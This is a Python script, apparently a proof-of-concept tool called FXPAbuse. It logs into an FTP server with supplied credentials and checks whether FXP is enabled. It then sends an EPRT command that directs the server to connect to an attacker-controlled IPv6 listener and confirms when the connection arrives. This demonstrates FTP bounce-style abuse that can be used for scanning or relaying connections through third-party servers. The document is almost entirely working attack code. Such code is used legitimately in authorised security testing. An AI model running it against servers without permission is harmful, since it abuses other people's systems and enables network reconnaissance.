import asyncore
import asynchat 
from socket import socket, AF_INET, AF_INET6, SOCK_STREAM
import argparse
from sys import argv

class Args(object):
    def __init__(self):
        self.parser = argparse.ArgumentParser()

    def parser_error(self, errmsg):
        print("Usage: python3 " + argv[0] + " use -h for help")
        exit("Error: {}".format(errmsg))

    def parse_args(self):
        self.parser._optionals.title = "OPTIONS"
        self.parser.add_argument('--host', help = "Server Host", required = True)
        self.parser.add_argument('--port', help = "Server Port", default = 21, type = int)
        self.parser.add_argument('--username', help = 'Username', required = True)
        self.parser.add_argument('--password', help = 'Password', required = True)
        self.parser.add_argument('--lhost', help = 'IPv6', required = True)
        self.parser.add_argument('--lport', help = 'Port', type = int, required = True)
        return self.parser.parse_args()

class FXPAbuse(asynchat.async_chat):
    def __init__(self, host, port, username, password, lhost, lport):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.lhost = lhost
        self.lport = lport
        Server(self.lhost, self.lport)
        self.init()
    
    def init(self):
        asynchat.async_chat.__init__(self)
        self.reading_headers = True
        self.set_terminator('inactivity.\r\n')
        self.create_socket(AF_INET, SOCK_STREAM)
        self.connect((self.host, self.port))
        self.buffer = []
        self.states = ['UserAuth', 'PassAuth', 'Abuse', 'Connect']
        self.state = 'UserAuth'
    
    def clear(self):
        self.buffer = []

    def collect_incoming_data(self, data):
        self.buffer.append(data)
    
    def found_terminator(self):
        if self.state == 'UserAuth':
            asynchat.async_chat.push(self, 'USER {}\r\n'.format(self.username))
            self.set_terminator('\r\n')
            self.state = 'PassAuth'
        elif self.state == 'PassAuth':
            asynchat.async_chat.push(self, 'PASS {}\r\n'.format(self.password))
            self.set_terminator('\r\n')
            self.state = 'Abuse'
        elif self.state == 'Abuse':
            if 'FXP' in self.buffer[0]:
                print('[*] FXP Enabled')
            elif 'authentication failed' in self.buffer[0]:
                exit('[-] Login authentication failed')
            else:
                exit('[-] FXP Disabled')
            asynchat.async_chat.push(self, 'EPRT |2|{0}|{1}|\r\n'.format(self.lhost, self.lport))
            self.set_terminator('successful\r\n')
            self.state = 'Connect'
        elif self.state == 'Connect':
            asynchat.async_chat.push(self, 'LIST\r\n')
            self.state = ''
        self.clear()

class Server(asyncore.dispatcher):
    def __init__(self, host, port): 
        self.host = host 
        self.port = port
        self.create()

    def create(self):
        asyncore.dispatcher.__init__(self)
        self.create_socket(AF_INET6, SOCK_STREAM) 
        self.set_reuse_addr() 
        self.bind((self.host, self.port)) 
        self.listen(1)

    def handle_accept(self): 
        pair = self.accept() 
        if pair is not None: 
            sock, address = pair
            exit('[+] [{0}]:{1}'.format(address[0], address[1]))

if __name__ == '__main__':
    args = Args().parse_args()
    FXPAbuse(host = args.host, port = args.port, username = args.username, password = args.password, lhost = args.lhost, lport = args.lport)
    asyncore.loop()
